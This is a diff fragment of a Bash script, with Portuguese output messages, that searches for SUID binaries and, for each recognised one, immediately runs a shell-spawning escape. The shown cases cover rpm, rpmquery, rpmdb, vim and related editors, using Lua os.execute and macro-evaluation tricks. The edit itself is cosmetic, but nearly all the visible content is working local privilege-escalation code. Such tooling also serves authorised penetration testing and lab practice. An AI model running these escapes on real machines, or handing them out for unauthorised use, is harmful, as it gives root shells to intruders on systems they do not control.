@@ -17,7 +17,6 @@ echo "[*] ---------------------------------------"
 echo -e "\e[0m"
 
 LSUID=$(find / -perm -u=s -type f 2>/dev/null)
-echo "Buscando..."
 for Lpath in $LSUID; do
     LSbin=$(basename "$Lpath")
 
@@ -165,11 +164,11 @@ for Lpath in $LSUID; do
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath" -p '`/bin/sh 1>&0`'
             ;;
-        rpm | rpmquery)
+        rpm|rpmquery)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath" --eval '%{lua:os.execute("/bin/sh")}'
             ;;
-        rpmdb | rpmverify)
+        rpmdb|rpmverify)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath" --eval '%(/bin/sh 1>&2)'
             ;;
@@ -179,7 +178,7 @@ for Lpath in $LSUID; do
             echo '! exec /bin/sh' >$TF
             "$Lpath" $TF
             ;;
-        rview | rvim | view | vim | vimdiff)
+        rview|rvim|view|vim|vimdiff)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath" -c ':lua os.execute("reset; exec sh")'
             ;;
